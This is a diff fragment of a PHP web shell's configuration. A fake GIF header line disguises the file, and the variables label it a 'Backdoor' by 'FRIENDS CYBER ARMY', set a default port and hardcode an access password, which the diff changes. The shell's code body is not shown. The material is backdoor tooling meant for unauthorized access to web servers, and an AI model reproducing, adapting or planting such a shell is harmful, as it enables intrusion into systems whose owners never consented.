@@ -13,11 +13,11 @@
 //GIF89a;
 
 
-$shell_name = "pp";
+$shell_name = "ap";
 $shell_fake_name = "<|B|a|c|k||d|o|o|r||FRIENDS CYBER ARMY |> ";
 $shell_title = " ~/ ".$shell_name." \~";
 $shell_version = "v2";
-$shell_password = "paingzx";
+$shell_password = "priv8shell";
 $shell_fav_port = "12345";
 $shell_color = "white";
 $shell_code = 
